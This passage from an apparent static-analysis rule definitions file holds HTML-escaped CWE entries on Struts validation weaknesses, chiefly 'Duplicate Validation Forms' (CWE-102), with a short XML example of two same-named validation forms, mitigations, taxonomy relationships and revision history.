&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Map every Action Form to a corresponding validation form.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Other Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Other Notes&lt;/div&gt;&lt;div name="oc_108_Other Notes" id="oc_108_Other Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;An action or a form may perform validation in other ways, but the Struts
Validator provides an excellent way to verify that all input receives at
least a basic level of checking. Without this approach, it is difficult, and
often impossible, to establish with a high level of confidence that all
input is validated.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Weakness Ordinalities"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Weakness Ordinalities&lt;/div&gt;&lt;div name="oc_108_Weakness Ordinalities" id="oc_108_Weakness Ordinalities" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Ordinality&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Primary&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div style="font-size:90%; font-style:italic; padding:5px;"&gt;(where
the weakness exists independent of other weaknesses)&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_108_Relationships" id="oc_108_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;20&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=20" target="_blank"&gt;Improper Input Validation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;101&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=101" target="_blank"&gt;Struts Validation Problems&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Causal Nature"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt;&lt;a href="javascript:toggleblocksOC('108_Causal Nature');"&gt;f&lt;/a&gt; &lt;/span&gt;Causal Nature&lt;/div&gt;&lt;div name="oc_108_Causal Nature" id="oc_108_Causal Nature" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Explicit&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_108_Taxonomy Mappings" id="oc_108_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Struts: Unvalidated Action Form&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_108_Content History" id="oc_108_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes, Taxonomy Mappings,
Weakness Ordinalities&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-11-24&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences, Description,
Other Notes&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-12-28&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences,
Other Notes&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2337</key><name>Struts2_Duplicate_Action_Field_Validators</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Struts: Duplicate Validation Forms&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;102&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_102_Description" id="oc_102_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The application uses multiple validation forms with the same
name, which might cause the Struts Validator to validate a form that the
programmer does not expect.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;If two validation forms have the same name, the Struts Validator
arbitrarily chooses one of the forms to use for input validation and
discards the other. This decision might not correspond to the programmer's
expectations, possibly leading to resultant weaknesses. Moreover, it
indicates that the validation logic is not up-to-date, and can indicate that
other, more subtle validation errors are present.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_102_Time of Introduction" id="oc_102_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_102_Applicable Platforms" id="oc_102_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_102_Common Consequences" id="oc_102_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Integrity&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Availability&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;If a J2EE application interfaces with native code that does not
perform array bounds checking, an attacker may be able to use an input
validation mistake in the J2EE application to launch a buffer overflow
attack.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_102_Demonstrative Examples" id="oc_102_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;Two validation forms with the same name.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;XML&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;&amp;lt;form-validation&amp;gt;&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;formset&amp;gt;&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;form name="ProjectForm"&amp;gt; ...
&amp;lt;/form&amp;gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;form name="ProjectForm"&amp;gt; ...
&amp;lt;/form&amp;gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;/formset&amp;gt;&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&amp;lt;/form-validation&amp;gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;It is critically important that validation logic be maintained and
kept in sync with the rest of the application.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_102_Potential Mitigations" id="oc_102_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;The DTD or schema validation will not catch the duplicate occurrence
of the same form name. To find the issue in the implementation, manual
checks or automated static analysis could be applied to the xml
configuration files.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Background Details"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Background Details&lt;/div&gt;&lt;div name="oc_102_Background Details" id="oc_102_Background Details" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Unchecked input is the root cause of some of today's worst and most common
software security problems. Cross-site scripting, SQL injection, and process
control vulnerabilities can all stem from incomplete or absent input
validation. &lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Weakness Ordinalities"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Weakness Ordinalities&lt;/div&gt;&lt;div name="oc_102_Weakness Ordinalities" id="oc_102_Weakness Ordinalities" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Ordinality&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Primary&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div style="font-size:90%; font-style:italic; padding:5px;"&gt;(where
the weakness exists independent of other weaknesses)&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_102_Relationships" id="oc_102_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;20&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=20" target="_blank"&gt;Improper Input Validation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;101&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=101" target="_blank"&gt;Struts Validation Problems&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;694&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=694" target="_blank"&gt;Use of Multiple Resources with Duplicate Identifier&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;722&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=722" target="_blank"&gt;OWASP Top Ten 2004 Category A1 - Unvalidated Input&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;675&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=675" target="_blank"&gt;Duplicate Operations on Resource&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Causal Nature"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt;&lt;a href="javascript:toggleblocksOC('102_Causal Nature');"&gt;f&lt;/a&gt; &lt;/span&gt;Causal Nature&lt;/div&gt;&lt;div name="oc_102_Causal Nature" id="oc_102_Causal Nature" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Explicit&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_102_Taxonomy Mappings" id="oc_102_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Struts: Duplicate Validation Forms&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_102_Content History" id="oc_102_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Example, Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes, Taxonomy Mappings,
Weakness Ordinalities&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-10-14&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Other Notes,
